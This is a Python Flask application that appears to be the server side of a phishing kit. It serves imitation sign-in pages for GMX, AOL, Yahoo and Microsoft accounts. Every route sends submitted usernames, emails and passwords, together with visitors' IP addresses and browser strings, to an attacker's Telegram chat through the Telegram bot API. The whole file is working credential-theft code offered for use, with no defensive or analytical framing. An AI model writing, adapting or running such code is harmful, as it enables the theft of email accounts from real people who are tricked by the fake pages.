import requests
from flask import Flask, render_template, request, redirect, url_for
from functools import wraps
from dotenv import load_dotenv
import os

# Load environment variables from .env file
load_dotenv()

# Flask app setup
app = Flask(__name__)

# Retrieve sensitive data from environment variables
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

# Function to send a message to Telegram
def send_telegram_message(message):
    """Send a message to a Telegram chat."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()  # Raise an error for bad status codes
    except requests.exceptions.RequestException as e:
        print(f"Error sending Telegram message: {e}")

# Function to get client IP and browser information
def get_client_info():
    """Retrieve the client's IP address and browser information."""
    ip_address = request.remote_addr or 'Unknown IP'
    browser = request.user_agent.string or 'Unknown Browser'
    return ip_address, browser

# Decorator to log client information
def log_client_info(func):
    """Decorator to log client information."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        ip_address, browser = get_client_info()
        message = f"Client Info:\nIP Address: {ip_address}\nBrowser: {browser}"
        send_telegram_message(message)
        return func(*args, **kwargs)
    return wrapper

# Routes
@app.route('/')
def home():
    return render_template('home.html')

@app.route('/gmx')
@log_client_info
def gmx():
    return render_template('gmx.html')

@app.route('/aoi', methods=['GET', 'POST'])
@log_client_info
def aoi():
    if request.method == 'POST':
        password = request.form.get('password')
        if password:
            ip_address, browser = get_client_info()
            send_telegram_message(f"New AOL Password submitted:\nPassword: {password}\nIP: {ip_address}\nBrowser: {browser}")
            return render_template('robert.html', password=password)
        else:
            error = "Please enter your Password."
            return render_template('aoi.html', error=error)
    return render_template('aoi.html')

@app.route('/robert')
@log_client_info
def robert():
    return render_template('robert.html')

@app.route('/aol')
@log_client_info
def aol():
    username = request.args.get('Username')
    if username:
        ip_address, browser = get_client_info()
        send_telegram_message(f"New AOL Username submitted:\nUsername: {username}\nIP: {ip_address}\nBrowser: {browser}")
        return redirect(url_for('aoi', username=username))
    else:
        error = "Please enter your username."
        return render_template('aol.html', error=error)

@app.route('/yahoo', methods=['GET', 'POST'])
@log_client_info
def yahoo():
    username = request.args.get('Username')
    if username:
        ip_address, browser = get_client_info()
        send_telegram_message(f"New Yahoo Username submitted:\nUsername: {username}\nIP: {ip_address}\nBrowser: {browser}")
        return redirect(url_for('yahoopass_submit', username=username))
    else:
        error = "Please enter your username."
        return render_template('yahoo.html', error=error)

@app.route('/yahoopass', methods=['GET', 'POST'])
@log_client_info
def yahoopass_submit():
    password = request.args.get('Password')
    if password:
        ip_address, browser = get_client_info()
        send_telegram_message(f"New Yahoo Password submitted:\nPassword: {password}\nIP: {ip_address}\nBrowser: {browser}")
        return render_template('robert.html', password=password)
    else:
        error = "Please enter your Password."
        return render_template('yahoopass.html', error=error)

@app.route('/ms', methods=['GET', 'POST'])
@log_client_info
def ms():
    if request.method == 'POST':
        email = request.form.get('uname')
        if email:
            ip_address, browser = get_client_info()
            send_telegram_message(f"Microsoft Sign-in Attempt:\nEmail: {email}\nIP: {ip_address}\nBrowser: {browser}")
            return render_template('ms2.html', email=email)
        else:
            error = "Please enter your email address."
            return render_template('ms.html', error=error)
    return render_template('ms.html')

@app.route('/ms2', methods=['POST'])
@log_client_info
def ms2():
    email = request.form.get('email')
    password = request.form.get('password')
    if email and password:
        ip_address, browser = get_client_info()
        send_telegram_message(f"Microsoft Sign-in Attempt:\nEmail: {email}\nPassword: {password}\nIP: {ip_address}\nBrowser: {browser}")
        return render_template('robert.html')
    else:
        error = "Please enter both email and password."
        return render_template('ms2.html', email=email, error=error)

@app.route('/submit', methods=['POST'])
@log_client_info
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    if username and password:
        ip_address, browser = get_client_info()
        send_telegram_message(f"New GMX Username and Password:\nUsername: {username}\nPassword: {password}\nIP: {ip_address}\nBrowser: {browser}")
        return render_template('robert.html', password=password)
    else:
        return "Please fill in all fields.", 400

# Run the app
if __name__ == '__main__':
    app.run(debug=True)
